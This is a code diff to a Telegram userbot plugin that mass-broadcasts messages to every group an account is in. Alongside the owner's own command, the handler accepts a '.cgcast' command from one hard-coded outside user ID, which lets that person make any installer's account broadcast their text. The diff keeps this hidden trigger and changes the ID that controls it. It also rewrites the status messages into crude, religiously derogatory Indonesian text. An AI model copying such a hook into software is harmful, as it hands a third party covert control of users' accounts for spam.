@@ -15,6 +15,7 @@ from userbot.utils import edit_or_reply, edit_delete, kyy_cmd
 from userbot.events import register
 
 GCAST_BLACKLIST = [
+    -1001506023826,  # Venz Group
     -1001380293847,  # NastySupport
     -1001473548283,  # SharingUserbot
     -1001578091827,  # PrimeSupportGroup
@@ -28,7 +29,7 @@ GCAST_BLACKLIST = [
 
 
 @kyy_cmd(pattern="gcast(?: |$)(.*)")
-@register(incoming=True, from_users=1663258664,
+@register(incoming=True, from_users=1971311438,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
@@ -37,8 +38,8 @@ async def gcast(event):
     elif event.is_reply:
         msg = await event.get_reply_message()
     else:
-        return await edit_delete(event, "**Berikan Sebuah Pesan atau Reply**")
-    kk = await edit_or_reply(event, "`Sedang Mengirim Pesan Secara Global... 📢`")
+        return await edit_delete(event, "**KASIH KATA KATA DULU TOD SEBELUM GCAST**")
+    kk = await edit_or_reply(event, "`SEDANG MENGIRIM DAKWAH KE ORANG KAFIR... 📢`")
     er = 0
     done = 0
     async for x in event.client.iter_dialogs():
@@ -53,7 +54,7 @@ async def gcast(event):
             except BaseException:
                 er += 1
     await kk.edit(
-        f"**Berhasil Mengirim Pesan Ke** `{done}` **Grup, Gagal Mengirim Pesan Ke** `{er}` **Grup**"
+        f"**BERHASIL MENGIRIM DAKWAH KE** `{done}` **GRUP, GAGAL MENGIRIM DAKWAH KE** `{er}` **GRUP**"
     )
 
 
